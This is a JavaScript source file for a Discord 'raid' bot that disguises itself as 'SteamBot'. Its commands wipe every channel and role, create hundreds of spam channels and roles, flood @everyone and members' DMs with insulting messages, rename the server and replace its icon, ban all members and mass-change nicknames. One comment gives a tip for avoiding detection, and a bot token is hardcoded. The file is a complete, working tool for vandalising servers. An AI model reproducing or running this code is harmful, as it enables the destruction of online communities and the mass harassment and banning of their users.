const Discord = require("discord.js");
const client = new Discord.Client();
 
client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`Cliente ${client.user.tag} listo para el raid!`);
    console.log("Bot creado por tu vieja en tanga");
    console.log(`Comandos:
  €nuke
  €osama
  €md
  €deleteroles
  €roles
  €foto
  €banall (hacerlo lo ultimo pq el discord.js lo detecta y saca a tu bot)
  €nick (nombre)
  `);
    presencia();  
    });
 
 
 
function presencia(){
  client.user.setPresence({
status: "Playing Steam Games",
activity: {
  name: "SteamBot",
  type: "getting bored :/"
 
}
  });
}
 
/////nuke/////
 
client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '€nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#alesonic-puto`, {
          type: 'text'
        }).then(channel => {
          channel.send("")
        })
         }
      })
 
/////raid/////
 
client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '€osama') {
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`RaidByBrunoB`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ")
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ");
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ");
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ");
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ");
              channel.send("@everyone تم الانتهاء من هذا الخادم من قبل سيدتك العجوز https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg ");
                  
              })
              }
              }
            });
          
/////mdall/////
 
          client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === "€md")
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("تم الانتهاء من هذا الخادم من قبل سيدتك العجوز").catch(error => {});
                        },450);
                      })
                      });
 
/////borar roles/////
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('€deleteroles')){
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
 
/////crear roles/////
 
client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '€roles') {
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `مرأتك العجوز في ثونغ`,color: '#d41818',},reason: 'razon',})
              };
               }
                });
 
/////foto y nombre/////
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                   if (message.content === '€foto') {
                      message.guild.setName("This server have been raided by امرأتك العجوز في ثونغ");
                      message.guild.setIcon("https://cdn.discordapp.com/attachments/897236901172477962/899459601831952454/raid.jpg"
                      );
                      }
                    }); 
 
/////banall/////
 
client.on("message", message => {
    if (message.author.bot) return;
  
    if (message.content === '€banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 
 
/////cambiar nombres/////
 
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '€nick'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{
 
      member.setNickname(nickname)
    })
    }
});
 
  client.login("ODkzNTkxNjQyMDM5Mjc1NTgw.YVdsEQ.C8FJgNBUGoTAr42OgjM9r5z6IAQ");
 
//Creditos a BrunoB - 